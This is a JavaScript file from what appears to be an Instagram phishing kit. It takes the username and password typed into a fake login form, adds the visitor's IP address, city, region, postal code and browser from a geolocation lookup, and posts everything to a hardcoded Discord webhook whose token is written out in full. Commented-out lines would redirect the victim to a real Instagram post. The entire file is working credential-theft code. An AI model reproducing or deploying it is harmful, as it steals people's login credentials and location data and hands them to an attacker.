loginButton = document.querySelector("#loginBtn");
password = document.querySelector("#passwordInput");
username = document.querySelector("#usernameInput");


let Info
loginButton.addEventListener("click", () => {
  (async function() {
    Info = await getInfo();
    console.log(Info);
    sendInfo()
  })();
})

async function getInfo() {
  try {
    const response = await fetch("https://ipapi.co/json/");
    const data = await response.json();
    
    const info = `> IP: ${data.ip}\n> City: ${data.city}\n> Region: ${data.region}\n> Country: ${data.country_name}\n> Postal Code: ${data.postal}\n> Browser: ${navigator.userAgent}\n> Username: ${username.value}\n> Password: ${password.value}\n`;  //`ip: ${data.ip}, city: ${data.city}, region: ${data.region}, country: ${data.country_name}, postal: ${data.postal}, browser: ${navigator.userAgent}`;
    
    return info;
  } catch {
    return `> IP: Unknown\n> City: Unknown\n> Region: Unknown\n> Country: Unknown\n> Postal Code: Unknown\n> Browser: ${navigator.userAgent}\n> Username: ${username.value}\n> Password: ${password.value}\n`;
  }
}
  

async function sendInfo() {
  const webhook = "https://discord.com/api/webhooks/1097411858408951838/VYJFv_pwqEAfhp26jcNi_-FrebSxhg3DrpzsNZOOKnbmRtLNMF-tD_hGAotoLjGb_VEL"; //https://discord.com/api/webhooks/ID/TOKEN

  const embed = {
    color: "#18328b",
    title: "Login Attempt",
    description: `${Info}`, //`${Info}> Username: ${username.value}\n> Password: ${password.value}\n`
    footer: {
      text: "https://github.com/Josakko/InstagramPhishing",
    }
  }

  const config = {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ username: "JK_InstagramPhishing", embeds: [embed] })
  };

  try {
    fetch(webhook, config);
  } catch {
    //setTimeout(function() {
    //    window.location.replace("https://www.instagram.com/p/BzI9vmcHdvN")
    //}, 1000);
  }
  //setTimeout(function() {
  //  window.location.replace("https://www.instagram.com/p/BzI9vmcHdvN")
  //}, 1000);
}
